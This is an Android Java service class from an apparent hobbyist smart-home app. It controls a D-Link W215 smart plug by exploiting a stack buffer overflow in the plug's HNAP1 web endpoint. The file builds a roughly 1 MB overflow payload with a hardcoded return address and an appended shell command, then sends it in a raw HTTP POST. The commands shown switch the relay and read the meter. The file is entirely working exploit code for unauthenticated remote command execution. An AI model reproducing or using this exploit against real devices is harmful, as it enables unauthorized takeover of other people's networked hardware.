package com.theggambler.smrthomecntrl;

import android.app.IntentService;
import android.content.Intent;
import android.os.Handler;
import android.os.SystemClock;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

/**
 * Created by Gene on 8/21/2016.
 */
public class W215CntrlService extends IntentService {
    protected final static String TAG = "W215CNTRL";

    public final static String W215_URL = "IP";
    public final static String W215_CMD = "CMD";
    public final static String W215_CMD_ON = "ON";
    public final static String W215_CMD_OFF = "OFF";
    public final static String W215_CMD_TEMP = "TEMP";

    private final byte[] RA = {(byte)0x00, (byte)0x40, (byte)0x5C, (byte)0xAC};
    private final int MODEL_SIZE = 1000000;
    private final static String CMD_ON = "/var/sbin/relay 1";
    private final static String CMD_OFF = "/var/sbin/relay 0";
    private final static String CMD_RD_TEMP = "cat /var/temp/meter";

    private String m_sURL = "192.168.0.157";

    public W215CntrlService() {
        super("W215CntrlService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        String cmd;

        if(intent.hasExtra(W215_URL))
            m_sURL = intent.getStringExtra(W215_URL);

        if(intent.hasExtra(W215_CMD))
            cmd = intent.getStringExtra(W215_CMD);
        else
            cmd = "";

        byte[] exploitCmd = builldExploit(cmd);
        try {
            sendCmd(m_sURL, exploitCmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private byte[] builldExploit(String sCmd)
    {
        int dFullSize = MODEL_SIZE + 20 + RA.length + 40 + sCmd.length() + 1;

        byte[] buf = new byte[dFullSize];
        Arrays.fill(buf, (byte)'D');

        byte[] sBufs = new byte[20];
        Arrays.fill(sBufs, (byte)'B');

        //stack filler
        byte[] fillBuf = new byte[40];
        Arrays.fill(fillBuf, (byte)'C');

        //get command
        byte[] cmdBuf = sCmd.getBytes();

        System.arraycopy(sBufs,  0, buf, MODEL_SIZE, sBufs.length);
        System.arraycopy(RA,     0, buf, MODEL_SIZE+sBufs.length, 4);


        System.arraycopy(fillBuf,0, buf, MODEL_SIZE+sBufs.length+RA.length, fillBuf.length);
        System.arraycopy(cmdBuf, 0, buf, MODEL_SIZE+sBufs.length+RA.length + fillBuf.length, sCmd.length());
        buf[dFullSize-1] = (byte)0x00;

        return buf;
    }

    private void sendCmd(String myurl , byte[] output) throws IOException
    {
        int port = 80;
        try{
            InetAddress addr = InetAddress.getByName(myurl);
            Socket socket = new Socket(addr, port);
            String path = "/HNAP1/";

            String out = "POST "+path+" HTTP/1.1\r\n"+
                "Connection: Close\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n" +
                "User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0; VS986 Build/MRA58K)\r\n" +
                "Host: " + myurl +"\r\n" +
                "Accept-Encoding:gzip\r\n" +
                "Content-Length: "+ Integer.toString(output.length)+"\r\n" +
                "\r\n";

            // Send parameters
            DataOutputStream os = new DataOutputStream (socket.getOutputStream());
            os.write(out.getBytes());

            if(output.length>1)
                os.write(output);

            os.write(new byte[]{(byte)'\r', (byte)'\n'});

            // Get response
            BufferedReader rd = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String line;
            String sLine = "";

            while ((line = rd.readLine()) != null) {
                sLine = sLine + line +"*";
            }

            Log.d(TAG, "Rx:" + sLine);

            rd.close();
            os.close();
            socket.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
